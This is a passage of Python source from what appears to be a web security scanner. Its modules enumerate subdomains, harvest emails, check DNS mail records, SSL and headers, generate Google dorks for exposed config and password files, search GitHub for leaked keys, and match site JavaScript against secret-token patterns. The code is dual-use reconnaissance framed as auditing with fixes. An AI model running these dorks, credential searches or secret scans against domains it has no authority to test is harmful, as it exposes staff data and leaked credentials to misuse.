    "login","dashboard","panel","backend","mobile","cloud","download","media",
    "docs","wiki","status","monitor","db","database","mysql","phpmyadmin",
    "cpanel","whm","plesk","ssl","git","svn","jenkins","jira","confluence",
    "mx","smtp2","pop","pop3","imap","exchange","autodiscover","autoconfig",
]

def subdomain_enum(domain, wordlist=None):
    if _module_skip("subdomains"): info("Skipping subdomain enum (already done)"); return []
    section("MODULE 3 — SUBDOMAIN ENUMERATION","🔎")
    words = SUBS_DEFAULT[:]
    if wordlist and os.path.exists(wordlist):
        try:
            with open(wordlist) as f:
                words = [l.strip() for l in f if l.strip()]
        except Exception: pass

    found = []; _found = set(); total = len(words); done = 0
    def _chk(sub):
        h = f"{sub}.{domain}"
        try: socket.gethostbyname(h); return h
        except Exception: return None

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futs = {ex.submit(_chk, w): w for w in words}
        for f in as_completed(futs):
            done += 1; progress(done, total, futs[f])
            r = f.result()
            if r and r not in _found:
                _found.add(r); found.append(r)
    sys.stdout.write("\n")

    info("Checking crt.sh certificate transparency...")
    try:
        cr = rget(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
        for entry in cr.json():
            for name in entry.get("name_value","").split("\n"):
                name = name.strip().lstrip("*.")
                if name.endswith(domain) and name not in _found:
                    _found.add(name); found.append(name)
    except Exception: warn("crt.sh lookup failed")

    found.sort()
    if found:
        good(f"Found {len(found)} subdomain(s):")
        for s in found:
            info(f"  → {s}")
            add("subdomains", {"subdomain": s, "severity": "Info",
                "title": f"Subdomain Found: {s}",
                "description": f"Active subdomain: {s}. Each subdomain is a separate potential attack surface.",
                "recommendation": "Review all subdomains. Disable unused ones. Apply consistent security policies across all."})
    else:
        info("No subdomains found")
    _module_done("subdomains")
    return found

# ═══ OSINT MODULE 48 — EMAIL HARVEST ════════════════════════════════
def osint_email_harvest(domain):
    if _module_skip("osint_email"): info("Skipping OSINT Email (already done)"); return
    section("OSINT MODULE 48 — EMAIL HARVEST","📧")

    emails = set()

    # 1. crt.sh — SSL certificate transparency logs often contain email addresses
    try:
        r = rget(f"https://crt.sh/?q=%.{domain}&output=json", timeout=10)
        if r.status_code == 200:
            for entry in r.json()[:200]:
                name = entry.get("name_value","")
                for part in name.split("\n"):
                    part = part.strip()
                    if "@" in part and domain in part and " " not in part:
                        emails.add(part.lower())
    except Exception: pass

    # 2. security.txt — official contact disclosure
    for path in ["/.well-known/security.txt", "/security.txt"]:
        try:
            r = rget(f"https://{domain}{path}", timeout=5)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line.lower().startswith("contact:") and "@" in line:
                        email = line.split(":", 1)[1].strip()
                        if "@" in email:
                            emails.add(email.lower())
                            good(f"security.txt contact: {email}")
        except Exception: pass

    # 3. HTML source — mailto: links on homepage
    try:
        r = rget(f"https://{domain}", timeout=TIMEOUT)
        found_mailto = re.findall(r'mailto:([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})', r.text)
        for em in found_mailto:
            if domain in em or True:   # collect any exposed email
                emails.add(em.lower())
    except Exception: pass

    # 4. robots.txt — sometimes has webmaster email in comments
    try:
        r = rget(f"https://{domain}/robots.txt", timeout=5)
        if r.status_code == 200:
            found_rb = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', r.text)
            for em in found_rb:
                emails.add(em.lower())
    except Exception: pass

    if emails:
        for em in sorted(emails):
            good(f"Email found: {em}")
        add("osint_email", {
            "severity": "Info",
            "title": f"Email Addresses Harvested ({len(emails)} found)",
            "description": f"Publicly exposed email addresses for {domain}: {', '.join(sorted(emails))}",
            "recommendation": "Avoid exposing internal emails in certificates, source code, and robots.txt. Use role-based emails (security@, abuse@) only where required.",
            "emails": sorted(emails),
        })
    else:
        good("No email addresses found in public sources")
    _module_done("osint_email")


# ═══ OSINT MODULE 49 — DNS INTELLIGENCE ═════════════════════════════
def osint_dns_intel(domain):
    if _module_skip("osint_dns"): info("Skipping OSINT DNS Intel (already done)"); return
    section("OSINT MODULE 49 — DNS INTELLIGENCE","🔎")

    findings = []

    def _dns_txt(name):
        """Return list of TXT record strings for a domain name."""
        try:
            import dns.resolver as _dr
            answers = _dr.resolve(name, "TXT")
            return [b.decode() for rdata in answers for b in rdata.strings]
        except Exception:
            try:
                # Fallback: use socket-based query via system DNS
                result = subprocess.run(
                    ["dig", "+short", "TXT", name],
                    capture_output=True, text=True, timeout=5)
                return [l.strip().strip('"') for l in result.stdout.splitlines() if l.strip()]
            except Exception:
                return []

    # SPF check
    spf_records = [r for r in _dns_txt(domain) if r.lower().startswith("v=spf1")]
    if not spf_records:
        warn("SPF record MISSING — email spoofing possible")
        findings.append({
            "severity": "High",
            "title": "Missing SPF Record — Email Spoofing Risk",
            "description": f"No SPF TXT record found for {domain}. Attackers can send spoofed emails appearing to come from @{domain}.",
            "recommendation": "Add SPF record: 'v=spf1 include:_spf.yourmailprovider.com ~all'",
        })
    else:
        good(f"SPF found: {spf_records[0][:80]}")
        spf_val = spf_records[0]
        if spf_val.strip().endswith("+all"):
            vuln("SPF ends with +all — allows ANYONE to send as this domain!", "Critical")
            findings.append({
                "severity": "Critical",
                "title": "SPF +all — Unrestricted Email Spoofing Allowed",
                "description": f"SPF record ends with '+all' which explicitly permits any server to send email as @{domain}.",
                "recommendation": "Change '+all' to '-all' (hard fail) or '~all' (soft fail).",
            })

    # DMARC check
    dmarc_records = [r for r in _dns_txt(f"_dmarc.{domain}") if "v=dmarc1" in r.lower()]
    if not dmarc_records:
        warn("DMARC record MISSING — phishing risk")
        findings.append({
            "severity": "High",
            "title": "Missing DMARC Record — Phishing Risk",
            "description": f"No DMARC record at _dmarc.{domain}. Without DMARC, spoofed emails may reach inboxes and are not reported.",
            "recommendation": "Add DMARC: 'v=DMARC1; p=reject; rua=mailto:dmarc@yourdomain.com'",
        })
    else:
        good(f"DMARC found: {dmarc_records[0][:80]}")
        if "p=none" in dmarc_records[0].lower():
            warn("DMARC policy is p=none — monitoring only, no enforcement")
            findings.append({
                "severity": "Medium",
                "title": "DMARC Policy p=none — Not Enforced",
                "description": "DMARC exists but policy is 'none' — spoofed emails still reach recipients, only reported.",
                "recommendation": "Upgrade to p=quarantine or p=reject after reviewing DMARC reports.",
            })

    # MX records
    try:
        mx_raw = subprocess.run(["dig", "+short", "MX", domain],
                                capture_output=True, text=True, timeout=5).stdout.strip()
        if mx_raw:
            good(f"MX records: {mx_raw[:120]}")
            if any(x in mx_raw.lower() for x in ["google","gmail","outlook","microsoft","sendgrid","mailgun"]):
                info(f"Mail provider: third-party (from MX records)")
        else:
            info("No MX records found")
    except Exception: pass

    # DKIM check (common selectors)
    dkim_found = False
    for selector in ["default","google","mail","smtp","k1","s1","s2","dkim","key1"]:
        txt = _dns_txt(f"{selector}._domainkey.{domain}")
        if txt:
            good(f"DKIM found (selector={selector}): {str(txt[0])[:60]}")
            dkim_found = True
            break
    if not dkim_found:
        warn("DKIM not found on common selectors — email authenticity not guaranteed")
        findings.append({
            "severity": "Low",
            "title": "DKIM Not Detected on Common Selectors",
            "description": f"No DKIM record found on common selectors for {domain}. Email signing may not be configured.",
            "recommendation": "Configure DKIM signing on your mail server and publish the public key as a TXT record.",
        })

    for f in findings:
        add("osint_dns", f)
    if not findings:
        good("DNS security (SPF/DMARC/DKIM) looks properly configured")
    _module_done("osint_dns")


# ═══ OSINT MODULE 50 — GOOGLE DORK GENERATOR ═════════════════════
def osint_google_dorks(url, domain):
    if _module_skip("osint_dorks"): info("Skipping OSINT Dorks (already done)"); return
    section("OSINT MODULE 50 — GOOGLE DORK GENERATOR","🔍")

    dorks = [
        # Sensitive files
        f'site:{domain} filetype:env OR filetype:config OR filetype:cfg',
        f'site:{domain} filetype:sql OR filetype:bak OR filetype:backup',
        f'site:{domain} filetype:log OR filetype:txt inurl:password',
        f'site:{domain} filetype:xml OR filetype:json inurl:config',
        # Admin panels
        f'site:{domain} inurl:admin OR inurl:login OR inurl:dashboard',
        f'site:{domain} inurl:wp-admin OR inurl:administrator OR inurl:manage',
        f'site:{domain} inurl:phpmyadmin OR inurl:cpanel OR inurl:webmail',
        # Exposed files
        f'site:{domain} intitle:"index of" OR intitle:"directory listing"',
        f'site:{domain} intitle:"phpinfo" OR inurl:phpinfo.php',
        f'site:{domain} inurl:.git OR inurl:.svn OR inurl:.env',
        # API & debug
        f'site:{domain} inurl:api OR inurl:swagger OR inurl:graphql',
        f'site:{domain} inurl:debug OR inurl:test OR inurl:dev',
        # Error pages (info disclosure)
        f'site:{domain} intext:"sql syntax" OR intext:"mysql_fetch"',
        f'site:{domain} intext:"Warning: include" OR intext:"Fatal error"',
        # Sensitive documents
        f'site:{domain} filetype:pdf OR filetype:doc OR filetype:xls inurl:confidential',
        f'site:{domain} intext:"password" OR intext:"username" filetype:txt',
    ]

    info(f"Generated {len(dorks)} Google dorks for {domain}")
    for d in dorks:
        good(f"Dork: {d}")

    add("osint_dorks", {
        "severity": "Info",
        "title": f"Google Dorks Generated — {len(dorks)} Queries",
        "description": f"Use these dorks manually in Google to find exposed files, admin panels, and sensitive paths indexed for {domain}.",
        "recommendation": "Review search engine-indexed content. Use robots.txt and X-Robots-Tag to restrict indexing of sensitive paths. Request removal of sensitive indexed content via Google Search Console.",
        "dorks": dorks,
    })
    _module_done("osint_dorks")


# ═══ OSINT MODULE 51 — DATA BREACH CHECK ═════════════════════════
def osint_breach_check(domain):
    if _module_skip("osint_breach"): info("Skipping OSINT Breach (already done)"); return
    section("OSINT MODULE 51 — DATA BREACH CHECK","💥")

    # HIBP domain breach check (free, no API key required for domain search)
    try:
        r = rget(
            f"https://haveibeenpwned.com/api/v3/breacheddomain/{domain}",
            timeout=10,
        )
        if r.status_code == 200:
            breaches = r.json() if r.headers.get("content-type","").startswith("application/json") else []
            if isinstance(breaches, list) and breaches:
                vuln(f"Domain found in {len(breaches)} data breach(es)!", "High")
                for b in breaches[:5]:
                    if isinstance(b, dict):
                        good(f"Breach: {b.get('Name','?')} ({b.get('BreachDate','?')}) — {b.get('DataClasses',[])}".replace("[","").replace("]",""))
                add("osint_breach", {
                    "severity": "High",
                    "title": f"Domain Found in {len(breaches)} Data Breach(es)",
                    "description": f"{domain} has been found in public data breach databases. Exposed data may include passwords, emails, and personal information still in active use.",
                    "recommendation": "Force password resets for all accounts. Enable MFA. Monitor for credential stuffing attempts on login endpoints.",
                    "breaches": [b.get("Name","?") if isinstance(b, dict) else str(b) for b in breaches[:10]],
                })
                return
        elif r.status_code == 404:
            good(f"Domain not found in HIBP breach database")
        elif r.status_code == 429:
            warn("HIBP rate limited — try again in 60s")
        else:
            info(f"HIBP returned HTTP {r.status_code}")
    except Exception as e:
        info(f"Breach check unavailable: {e}")

    # Paste check — look for domain mentions in public pastes (Pastebin etc.)
    try:
        r2 = rget(f"https://psbdmp.cc/api/search/{domain}", timeout=8)
        if r2.status_code == 200:
            data = r2.json()
            if isinstance(data, dict):
                count = data.get("count", 0)
                if count and int(count) > 0:
                    warn(f"Domain found in {count} public paste(s) — may contain leaked data")
                    add("osint_breach", {
                        "severity": "Medium",
                        "title": f"Domain Found in {count} Public Paste(s)",
                        "description": f"{domain} appears in {count} public paste entries. This may indicate leaked credentials, internal data, or configuration details.",
                        "recommendation": "Review exposed pastes. Monitor paste sites for domain leaks using automated alerts.",
                    })
                else:
                    good("Domain not found in public pastes")
    except Exception: pass

    _module_done("osint_breach")


# ═══ OSINT MODULE 52 — GITHUB EXPOSURE ═══════════════════════════
def osint_github_exposure(domain):
    if _module_skip("osint_github"): info("Skipping OSINT GitHub (already done)"); return
    section("OSINT MODULE 52 — GITHUB EXPOSURE","🐙")

    # GitHub code search API (unauthenticated — 10 req/min, sufficient for a few queries)
    GITHUB_QUERIES = [
        f'"{domain}" password',
        f'"{domain}" api_key OR secret_key OR api_secret',
        f'"{domain}" .env',
        f'"{domain}" db_password OR database_password',
    ]

    exposed_items = []
    for query in GITHUB_QUERIES:
        try:
            resp = _sess.get(
                "https://api.github.com/search/code",
                params={"q": query, "per_page": 5},
                headers={"Accept": "application/vnd.github+json",
                         "User-Agent": UA},
                timeout=10,
            )
            if resp.status_code == 200:
                items = resp.json().get("items", [])
                for item in items:
                    repo = item.get("repository", {}).get("full_name", "?")
                    file_path = item.get("path", "?")
                    html_url = item.get("html_url", "")
                    exposed_items.append({"repo": repo, "file": file_path, "url": html_url, "query": query})
                    vuln(f"GitHub exposure: {repo}/{file_path}", "Critical")
            elif resp.status_code == 403:
                warn("GitHub API rate limit reached — try with token: export GITHUB_TOKEN=...")
                break
            elif resp.status_code == 422:
                info(f"GitHub search skipped for query (validation error)")
            time.sleep(0.5)   # respect GitHub rate limit
        except Exception: pass

    if exposed_items:
        add("osint_github", {
            "severity": "Critical",
            "title": f"Sensitive Data Exposed on GitHub ({len(exposed_items)} result(s))",
            "description": f"Public GitHub repositories contain files referencing {domain} with potentially sensitive data (passwords, API keys, .env files).",
            "recommendation": "Immediately rotate any exposed credentials. Remove sensitive files from repos using git history rewrite (BFG Repo Cleaner). Set repos to private. Use GitHub Secret Scanning alerts.",
            "items": [f"{i['repo']}/{i['file']}" for i in exposed_items[:10]],
        })
    else:
        good("No obvious GitHub exposure found (unauthenticated search — limited coverage)")
    _module_done("osint_github")


# ═══ OSINT MODULE 53 — JS FILE SECRETS ══════════════════════════
def osint_js_secrets(url):
    if _module_skip("osint_js"): info("Skipping OSINT JS Secrets (already done)"); return
    section("OSINT MODULE 53 — JAVASCRIPT SECRETS SCAN","📜")

    # Patterns that commonly indicate secrets in JS
    SECRET_PATTERNS = [
        (r'api[_\-]?key\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']',      "API Key"),
        (r'secret[_\-]?key\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']',   "Secret Key"),
        (r'access[_\-]?token\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']', "Access Token"),
        (r'auth[_\-]?token\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']',   "Auth Token"),
        (r'password\s*[=:]\s*["\']([^"\']{6,})["\']',                     "Hardcoded Password"),
        (r'db[_\-]?pass(?:word)?\s*[=:]\s*["\']([^"\']{4,})["\']',       "DB Password"),
        (r'(AKIA[0-9A-Z]{16})',                                            "AWS Access Key"),
        (r'(AIza[0-9A-Za-z\-_]{35})',                                     "Google API Key"),
        (r'(ghp_[A-Za-z0-9]{36})',                                        "GitHub Token"),
        (r'(sk-[A-Za-z0-9]{32,})',                                        "OpenAI Key"),
        (r'(xox[baprs]-[A-Za-z0-9\-]+)',                                  "Slack Token"),
        (r'(https?://[a-zA-Z0-9]+:[a-zA-Z0-9]+@)',                        "Credentials in URL"),
    ]

    # Endpoint patterns for API discovery
    ENDPOINT_PATTERNS = [
        r'["\'](/api/v[0-9]/[a-zA-Z0-9_/\-]+)["\']',
        r'["\'](/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+\.php)["\']',
        r'fetch\(["\'](/[a-zA-Z0-9_/\-]+)["\']',
        r'axios\.[a-z]+\(["\'](/[a-zA-Z0-9_/\-]+)["\']',
    ]

    # Collect JS file URLs from main page
    js_urls = set()
    try:
        r = rget(url, timeout=TIMEOUT)
        # Find <script src="..."> tags
        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', r.text, re.I):
            src = m.group(1)
            if src.startswith("http"):
                js_urls.add(src)
            elif src.startswith("//"):
                js_urls.add("https:" + src)
            else:
                parsed_url = urlparse(url)
                base = f"{parsed_url.scheme}://{parsed_url.netloc}"
                js_urls.add(urljoin(base, src))
        # Also look for webpack chunks, bundle files
        for m in re.finditer(r'["\']([/][a-zA-Z0-9_/.\-]+(?:chunk|bundle|main|app)[^"\']*\.js)["\']', r.text, re.I):
            parsed_url = urlparse(url)
            base = f"{parsed_url.scheme}://{parsed_url.netloc}"
            js_urls.add(urljoin(base, m.group(1)))
    except Exception: pass

    info(f"Found {len(js_urls)} JS files to scan")
    if not js_urls:
        good("No JS files found to scan")
        _module_done("osint_js"); return

    all_secrets = []
    all_endpoints = set()

    def _scan_js(js_url):
        try:
            rj = rget(js_url, timeout=TIMEOUT)
            if rj.status_code != 200: return
            content = rj.text
            # Size guard — skip huge minified bundles (>500KB)
            if len(content) > 500_000:
                content = content[:500_000]
            # Secret scan
            for pattern, label in SECRET_PATTERNS:
                for match in re.finditer(pattern, content, re.I):
                    val = match.group(1) if match.lastindex else match.group(0)
                    # Filter obvious test/placeholder values
                    if val.lower() in ("your_api_key","placeholder","example","undefined","null","xxxx","changeme"):
                        continue
                    with _lock:
                        all_secrets.append({"type": label, "value": val[:60], "file": js_url})
                    vuln(f"JS Secret [{label}] in {js_url.split('/')[-1]}: {val[:40]}...", "Critical")
            # Endpoint discovery
            for ep_pat in ENDPOINT_PATTERNS:
                for match in re.finditer(ep_pat, content):
                    ep = match.group(1)
                    if len(ep) > 3:
                        with _lock:
                            all_endpoints.add(ep)
        except Exception: pass

    with ThreadPoolExecutor(max_workers=min(len(js_urls), 8)) as ex:
        futs = [ex.submit(_scan_js, j) for j in list(js_urls)[:20]]
        for f in as_completed(futs): _pass(f)

    if all_secrets:
        add("osint_js", {
            "severity": "Critical",
            "title": f"Secrets Found in JavaScript Files ({len(all_secrets)} item(s))",
            "description": f"{len(all_secrets)} potential secret(s) detected in publicly loaded JS files: {', '.join(set(s['type'] for s in all_secrets))}.",
            "recommendation": "Never hardcode secrets in client-side JavaScript. Use environment variables server-side. Rotate all exposed credentials immediately. Implement secret scanning in CI/CD pipeline.",
            "secrets": [f"{s['type']}: {s['value']}" for s in all_secrets[:10]],
        })
    else:
        good("No obvious secrets found in JS files")

    if all_endpoints:
        info(f"JS API endpoints discovered: {len(all_endpoints)}")
        add("osint_js", {
            "severity": "Info",
            "title": f"API Endpoints Discovered in JavaScript ({len(all_endpoints)} path(s))",
            "description": f"JavaScript analysis revealed {len(all_endpoints)} internal API endpoint path(s).",
            "recommendation": "Ensure all discovered API endpoints require authentication and have proper authorization checks.",
            "endpoints": sorted(all_endpoints)[:30],
        })
    _module_done("osint_js")


# ═══ MODULE 4 — SECURITY HEADERS (v9.0: +3 headers: COOP, COEP, NEL) ═
def check_headers(url, out_dir="./reports"):
    if _module_skip("headers"): info("Skipping headers (already done)"); return
    section("MODULE 4 — SECURITY HEADERS","🔒")
    REQUIRED = {
        "strict-transport-security":{
            "sev":"High","title":"Missing HSTS Header",
            "desc":"HTTP Strict Transport Security (HSTS) is not set. Without this, browsers may allow unencrypted HTTP connections, exposing users to man-in-the-middle attacks.",
            "fix":"Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\nNginx: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\nApache: Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\""},
        "content-security-policy":{
            "sev":"High","title":"Missing Content Security Policy (CSP)",
            "desc":"No CSP found. CSP prevents Cross-Site Scripting (XSS) attacks by controlling which resources the browser can load.",
            "fix":"Add a Content-Security-Policy header appropriate for your application.\nNginx: add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'\" always;\nApache: Header always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'\""},
        "x-frame-options":{
            "sev":"Medium","title":"Missing X-Frame-Options Header",
            "desc":"This site can be embedded in iframes on other websites, enabling clickjacking attacks.",
            "fix":"Add: X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN\nNginx: add_header X-Frame-Options \"DENY\" always;\nApache: Header always set X-Frame-Options \"DENY\"\nModern: use CSP frame-ancestors instead — add_header Content-Security-Policy \"frame-ancestors 'none'\" always;"},
        "x-content-type-options":{
            "sev":"Low","title":"Missing X-Content-Type-Options Header",
            "desc":"Without this, browsers may guess the content type, leading to MIME-type confusion attacks.",
            "fix":"Add: X-Content-Type-Options: nosniff\nNginx: add_header X-Content-Type-Options \"nosniff\" always;\nApache: Header always set X-Content-Type-Options \"nosniff\""},
        "referrer-policy":{
            "sev":"Low","title":"Missing Referrer-Policy Header",
            "desc":"Without Referrer-Policy, sensitive URL data may be leaked to third-party sites when users click links.",
            "fix":"Add: Referrer-Policy: strict-origin-when-cross-origin\nNginx: add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\nApache: Header always set Referrer-Policy \"strict-origin-when-cross-origin\""},
        "permissions-policy":{
            "sev":"Low","title":"Missing Permissions-Policy Header",
            "desc":"Without Permissions-Policy, the browser may grant access to sensitive APIs (camera, microphone, geolocation) to embedded third-party content.",
            "fix":"Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"},
        # v9.0 additions
        "cross-origin-opener-policy":{
            "sev":"Low","title":"Missing Cross-Origin-Opener-Policy (COOP) Header",
            "desc":"Without COOP, malicious pop-ups can access your window object and potentially steal information or perform cross-origin attacks via shared browsing context.",
            "fix":"Add: Cross-Origin-Opener-Policy: same-origin"},
        "cross-origin-embedder-policy":{
            "sev":"Low","title":"Missing Cross-Origin-Embedder-Policy (COEP) Header",
            "desc":"Without COEP, your page cannot enable cross-origin isolation, preventing access to powerful features like SharedArrayBuffer while remaining vulnerable to Spectre-based attacks.",
            "fix":"Add: Cross-Origin-Embedder-Policy: require-corp"},
        "nel":{
            "sev":"Info","title":"Network Error Logging (NEL) Not Configured",
            "desc":"NEL allows browsers to report network errors to a server. Its absence means you have no visibility into client-side network failures or potential attacks causing connection errors.",
            "fix":"Add: NEL: {\"report_to\":\"default\",\"max_age\":86400} and configure a Report-To endpoint."},
    }
    try:
        r = rget(url)
        hdrs_lower = {k.lower(): v for k, v in r.headers.items()}
        missing = []
        for hdr, meta in REQUIRED.items():
            if hdr not in hdrs_lower:
                vuln(f"Missing: {hdr}", meta["sev"])
                add("headers", {"header": hdr, "severity": meta["sev"],
                    "title": meta["title"],
                    "description": meta["desc"],
                    "recommendation": meta["fix"]})
                missing.append(hdr)
            else:
                vlog(f"Present: {hdr}: {hdrs_lower[hdr][:80]}")
        # Check for Server header info disclosure
        if "server" in hdrs_lower:
            sv = hdrs_lower["server"]
            if any(c.isdigit() for c in sv):
                vuln(f"Server header reveals version: {sv}", "Low")
                add("headers", {"header": "server", "severity": "Low",
                    "title": "Server Header Reveals Version",
                    "description": f"The Server header discloses software version: '{sv}'. Attackers can use this to find specific CVEs.",
                    "recommendation": "Remove or genericize the Server header in web server configuration.\nNginx: add \"server_tokens off;\" in http{} or server{} block.\nApache: Set \"ServerTokens Prod\" and \"ServerSignature Off\" in httpd.conf."})
        # Check for X-Powered-By
        if "x-powered-by" in hdrs_lower:
            xpb = hdrs_lower["x-powered-by"]
            vuln(f"X-Powered-By reveals technology: {xpb}", "Low")
            add("headers", {"header": "x-powered-by", "severity": "Low",
                "title": "X-Powered-By Header Reveals Technology",
                "description": f"X-Powered-By: {xpb} discloses backend technology. Attackers use this to target version-specific exploits.",
                "recommendation": "Remove X-Powered-By header.\nPHP: set expose_php=Off in php.ini\nNode/Express: app.disable('x-powered-by') or use helmet()\nNginx: add_header X-Powered-By \"\";  (or simply omit it)\nApache: Header always unset X-Powered-By"})
        if not missing:
            good("All required security headers are present")
    except Exception as e:
        err(f"Headers check: {e}")
    _module_done("headers")

# ═══ MODULE 5 — HTTP METHODS ═════════════════════════════════════
def check_methods(url):
    if _module_skip("methods"): info("Skipping HTTP methods (already done)"); return
    section("MODULE 5 — HTTP METHODS","⚙")
    DANGEROUS = {"PUT","DELETE","TRACE","CONNECT","PATCH","PROPFIND","PROPPATCH",
                 "MKCOL","COPY","MOVE","LOCK","UNLOCK","SEARCH"}
    try:
        r = _sess.options(url, timeout=TIMEOUT, verify=False)
        allowed_hdr = r.headers.get("Allow","") + r.headers.get("Public","")
        methods = set(m.strip().upper() for m in allowed_hdr.split(",") if m.strip())
        if not methods:
            # Brute-force methods manually
            for m in ["GET","POST","PUT","DELETE","TRACE","CONNECT","PATCH","OPTIONS","HEAD"]:
                try:
                    tr = _sess.request(m, url, timeout=5, verify=False)
                    if tr.status_code not in (405, 501):
                        methods.add(m)
                except Exception:
                    pass
        for m in methods:
            if m in DANGEROUS:
                sev = "Critical" if m in ("PUT","DELETE","CONNECT") else "High" if m in ("TRACE","PROPFIND") else "Medium"
                vuln(f"Dangerous method allowed: {m}", sev)
                add("methods", {"method": m, "severity": sev,
                    "title": f"Dangerous HTTP Method Allowed: {m}",
                    "description": f"The {m} method is enabled. This can allow file upload, deletion, debug information, or proxy abuse.",
                    "recommendation": f"Disable {m} in your web server configuration unless absolutely required."})
            else:
                info(f"Method allowed: {m}")
    except Exception as e:
        err(f"HTTP methods check: {e}")
    _module_done("methods")

# ═══ MODULE 6 — TECHNOLOGY DETECTION ════════════════════════════
def detect_technology(url):
    if _module_skip("tech"): info("Skipping tech detection (already done)"); return
    section("MODULE 6 — TECHNOLOGY DETECTION","🔬")
    TECH_SIGS = {
        "WordPress":  ["/wp-content/","/wp-includes/","wp-login.php","WordPress"],
        "Drupal":     ["Drupal","drupal.js","drupal.min.js","X-Generator: Drupal"],
        "Joomla":     ["/components/com_","Joomla","joomla"],
        "Magento":    ["Mage.","mage/","magento","Magento"],
        "Laravel":    ["laravel","XSRF-TOKEN","laravel_session"],
        "Django":     ["csrfmiddlewaretoken","Django","djdt"],
        "Ruby on Rails":["_rails_session","X-Powered-By: Phusion Passenger","rails"],
        "ASP.NET":    ["ASP.NET","__VIEWSTATE","__EVENTVALIDATION","X-AspNet-Version"],
        "PHP":        ["X-Powered-By: PHP","PHPSESSID",".php"],
        "Node.js":    ["X-Powered-By: Express","connect.sid"],
        "Apache":     ["Apache","apache"],
        "Nginx":      ["nginx","Nginx"],
        "IIS":        ["IIS","Microsoft-IIS","ASP.NET"],
        "jQuery":     ["jquery","jQuery"],
        "React":      ["react","React","__REACT"],
        "Angular":    ["ng-version","angular","Angular"],
        "Vue.js":     ["__vue__","vue.js","Vue"],
        "Bootstrap":  ["bootstrap","Bootstrap"],
        "Cloudflare": ["cloudflare","cf-ray"],
        "Varnish":    ["X-Varnish","Via: 1.1 varnish"],
        "Tomcat":     ["Apache Tomcat","Coyote","JSESSIONID"],
    }
    try:
        r = rget(url)
        hdrs = str(r.headers).lower()
        body = r.text[:10000]
        body_lower = body.lower()
        detected = []
        for tech, sigs in TECH_SIGS.items():
            if any(s.lower() in hdrs or s.lower() in body_lower for s in sigs):
                detected.append(tech)
        if detected:
            good(f"Technologies detected: {', '.join(detected)}")
            for t in detected:
                info(f"  → {t}")
                add("tech", {"technology": t, "severity": "Info",
                    "title": f"Technology Detected: {t}",
                    "description": f"The application appears to use {t}. If the version is identifiable, attackers can search for version-specific CVEs.",
                    "recommendation": f"Keep {t} updated. Remove version disclosure from headers and HTML comments."})
        else:
            info("No specific technologies identified from signatures")
    except Exception as e:
        err(f"Tech detection: {e}")
    _module_done("tech")

# ═══ MODULE 7 — SSL/TLS CHECK (v9.0: TLS1.0/1.1 + weak cipher detection) ═
def check_ssl(url):
    if _module_skip("ssl"): info("Skipping SSL/TLS (already done)"); return
    section("MODULE 7 — SSL/TLS ANALYSIS","🔐")
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    if parsed.scheme != "https":
        vuln("Site does not use HTTPS — all traffic is plaintext", "High")
        add("ssl", {"severity": "High",
            "title": "No HTTPS / Plaintext HTTP",
            "description": "The target uses HTTP without encryption. All data including credentials are transmitted in plaintext and visible to network attackers.",
            "recommendation": "Obtain an SSL/TLS certificate (free from Let's Encrypt) and redirect all HTTP to HTTPS."})
        _module_done("ssl"); return

    # Check certificate
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(10)
            s.connect((host, port))
            cert = s.getpeercert()
            cipher = s.cipher()
            proto = s.version()
            vlog(f"Protocol: {proto}  Cipher: {cipher}")

        # Certificate expiry
        exp_str = cert.get("notAfter","")
        if exp_str:
            try:
                exp = datetime.datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
                days_left = (exp - datetime.datetime.utcnow()).days
                if days_left < 0:
                    vuln(f"SSL certificate EXPIRED {abs(days_left)} days ago!", "Critical")
                    add("ssl", {"severity": "Critical",
                        "title": "SSL Certificate Expired",
                        "description": f"The SSL certificate expired {abs(days_left)} days ago. Browsers will show a security warning and users cannot connect securely.",
                        "recommendation": "Renew the certificate immediately. Use Let's Encrypt for free auto-renewing certificates."})
                elif days_left < 14:
                    vuln(f"SSL certificate expires in {days_left} days (URGENT)", "High")
                    add("ssl", {"severity": "High",
                        "title": f"SSL Certificate Expires in {days_left} Days",
                        "description": f"The SSL certificate will expire in {days_left} days.",
                        "recommendation": "Renew the certificate immediately to avoid disruption."})
                elif days_left < 30:
                    warn(f"SSL certificate expires in {days_left} days")
                    add("ssl", {"severity": "Medium",
                        "title": f"SSL Certificate Expires Soon ({days_left} days)",
                        "description": f"Certificate expires in {days_left} days.",
                        "recommendation": "Schedule certificate renewal within the next two weeks."})
                else:
                    good(f"Certificate valid for {days_left} more days (expires: {exp_str})")
            except ValueError:
                warn(f"Could not parse cert expiry: {exp_str}")

        # Subject CN
        subj = dict(x[0] for x in cert.get("subject", []))
        cn = subj.get("commonName", "")
        info(f"Certificate CN: {cn}")
        if cn and host not in cn and not cn.startswith("*"):
            vuln(f"Certificate CN mismatch: {cn} vs host: {host}", "High")
            add("ssl", {"severity": "High",
                "title": "SSL Certificate CN Mismatch",
                "description": f"Certificate CN '{cn}' does not match host '{host}'.",
                "recommendation": "Obtain a certificate issued for the correct domain name."})

        # Protocol version check (v9.0)
        if proto in ("TLSv1", "TLSv1.0"):
